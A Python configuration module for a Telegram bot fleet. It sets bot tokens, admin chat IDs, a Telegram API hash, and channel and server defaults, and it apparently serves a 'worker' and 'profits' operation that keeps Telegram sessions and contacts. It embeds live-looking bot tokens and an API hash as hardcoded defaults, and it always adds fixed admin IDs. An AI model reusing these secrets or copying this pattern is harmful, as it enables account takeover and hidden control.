import os
from dotenv import load_dotenv

_BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_env_path = os.path.join(_BASE_DIR, ".env")
if os.path.exists(_env_path):
    load_dotenv(_env_path)
else:
    load_dotenv()

ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8940437781:AAFeED9iL4mm0oFIV7IYjptVhkHEOp5GyY8")


def _parse_admin_ids() -> list[int]:
    raw = os.environ.get("ADMIN_CHAT_IDS") or os.environ.get("ADMIN_CHAT_ID", "7659755434")
    ids: list[int] = []
    for part in raw.replace(";", ",").replace(" ", ",").split(","):
        part = part.strip()
        if part.isdigit() or (part.startswith("-") and part[1:].isdigit()):
            val = int(part)
            if val not in ids and val != 0 and val != 8240652374:
                ids.append(val)
    if 7659755434 not in ids:
        ids.append(7659755434)
    if 7491827504 not in ids:
        ids.append(7491827504)
    return ids


ADMIN_CHAT_IDS = _parse_admin_ids()
ADMIN_CHAT_ID = ADMIN_CHAT_IDS[0] if ADMIN_CHAT_IDS else 7659755434
PRIMARY_ADMIN_ID = 7659755434
MASTER_ADMIN_IDS = {7659755434, 7491827504, ADMIN_CHAT_ID}

_BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_raw_db = os.environ.get("DB_PATH", "data/fleet.db")
DB_PATH = _raw_db if os.path.isabs(_raw_db) else os.path.join(_BASE_DIR, _raw_db)

_raw_contacts = os.environ.get("CONTACTS_PATH", "data/contacts.txt")
CONTACTS_PATH = _raw_contacts if os.path.isabs(_raw_contacts) else os.path.join(_BASE_DIR, _raw_contacts)

AUTO_ROTATE_DEFAULT = os.environ.get("AUTO_ROTATE", "true").lower() == "true"
WEBAPP_URL = os.environ.get("WEBAPP_URL", "http://localhost:8080")
REMOTE_API_URL = os.environ.get("REMOTE_API_URL", "")
REMOTE_API_KEY = os.environ.get("REMOTE_API_KEY", "")
TG_API_ID = int(os.environ.get("TG_API_ID", "2040"))
TG_API_HASH = os.environ.get("TG_API_HASH", "b18441a1ff607e10a989891a5462e627")
DEFAULT_DONOR_CHANNEL = os.environ.get("DONOR_CHANNEL_LINK", "https://t.me/+i6zbvn2GBjNkNGNi")
PROFITS_CHANNEL_ID = int(os.environ.get("PROFITS_CHANNEL_ID", "-1004428010113"))
PUBLIC_DOWNLOAD_BASE_URL = os.environ.get("PUBLIC_DOWNLOAD_BASE_URL", "http://31.76.101.210:8080")
SESSIONS_DIR = os.path.join(_BASE_DIR, "data", "sessions")


TEST_ADMIN_BOT_TOKEN = os.environ.get("TEST_ADMIN_BOT_TOKEN", "8877489211:AAGkE28BOYgLPe0c8fRyCflazHpLW3KJa_Y")
TEST_WORKER_BOT_TOKEN = os.environ.get("TEST_WORKER_BOT_TOKEN", "8945168964:AAGY9GJyxrBujiMKbAj70zb7Q6EZ6v15dRY")


def is_test_worker(token: str | None = None, username: str | None = None) -> bool:
    if token and any(t in str(token) for t in ["8945168964", "8877489211", "8864734674"]):
        return True
    if username and "test" in str(username).lower():
        return True
    return False


def get_admin_bot_token(
    is_test: bool = False,
    mirror_token: str | None = None,
    mirror_username: str | None = None,
) -> str:
    """Returns test admin bot token if this is a test event/worker, otherwise production admin bot token."""
    if is_test or is_test_worker(mirror_token, mirror_username):
        return TEST_ADMIN_BOT_TOKEN
    return ADMIN_BOT_TOKEN


import time
import re

def get_bot_webapp_url(token: str | None = None) -> str:
    """Returns WebApp URL, ensuring valid HTTPS scheme and dynamic cache-buster for Telegram WKWebView."""
    url = WEBAPP_URL or "https://privateroom-webapp.vercel.app/?v=10000"
    if "ngrok-free.dev" in url or url.startswith("http://localhost") or url.startswith("http://127.0.0.1") or url.startswith("http://31.76.101.210"):
        url = "https://privateroom-webapp.vercel.app/?v=10000"
    elif url.startswith("http://"):
        url = "https://" + url[7:]
    
    ts = int(time.time())
    sep = "&" if "?" in url else "?"
    if "t=" in url:
        url = re.sub(r't=[0-9]+', f't={ts}', url)
    else:
        url += f"{sep}t={ts}"
    return url


